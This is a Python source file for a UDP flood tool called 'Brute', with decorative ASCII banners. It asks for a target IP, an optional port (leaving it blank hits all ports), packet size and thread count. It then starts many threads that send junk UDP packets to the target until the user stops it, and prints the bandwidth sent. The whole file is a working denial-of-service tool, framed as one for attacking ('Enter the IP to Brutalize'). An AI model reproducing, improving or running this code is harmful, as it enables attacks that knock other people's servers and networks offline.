from socket import socket, AF_INET, SOCK_DGRAM
import os
from threading import Thread
from random import choices, randint
from time import time, sleep

from pystyle import *
from getpass import getpass as hinput



class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000
        

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)




ascii = r'''

▀█████████▄     ▄████████ ███    █▄      ███        ▄████████ 
  ███    ███   ███    ███ ███    ███ ▀█████████▄   ███    ███ 
  ███    ███   ███    ███ ███    ███    ▀███▀▀██   ███    █▀  
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███     ███   ▀  ▄███▄▄▄     
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███     ███     ▀▀███▀▀▀     
  ███    ██▄ ▀███████████ ███    ███     ███       ███    █▄  
  ███    ███   ███    ███ ███    ███     ███       ███    ███ 
▄█████████▀    ███    ███ ████████▀     ▄████▀     ██████████ 
               ███    ███                                              '''



banner = r"""
       █████████████████████
    ████▀                 ▀████
  ███▀                       ▀███
 ██▀                           ▀██
█▀                               ▀█
█                                 █
█   █████                 █████   █
█  ██▓▓▓███             ███▓▓▓██  █
█  ██▓▓▓▓▓██           ██▓▓▓▓▓██  █
█  ██▓▓▓▓▓▓██         ██▓▓▓▓▓▓██  █
█▄  ████▓▓▓▓██       ██▓▓▓▓████  ▄█
▀█▄   ▀███▓▓▓██     ██▓▓▓███▀   ▄█▀
  █▄    ▀█████▀     ▀█████▀    ▄█
  ██           ▄█ █▄           ██
  ██           ██ ██           ██
  ██                           ██
  ▀██  ██▀██  █  █  █  ██▀██  ██▀
   ▀████▀ ██  █  █  █  ██ ▀████▀
          ██  █  █  █  ██  
          ██  █  █  █  ██
          ██  █  █  █  ██
           █▄▄█▄▄█▄▄█▄▄█""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))


def init():
    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".B.r.u.t.e. .-. .b.y. .b.i.l.l.y.t.h.e.g.o.a.t.3.5.6.".replace('.',''))
    Cursor.HideCursor()


init()


def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()


def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))


    ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
    print()
    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Error! Please enter a correct IP address.")



    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")


    threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")


    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')


    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("A fatal error has occured and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))

if __name__ == '__main__':
    main()    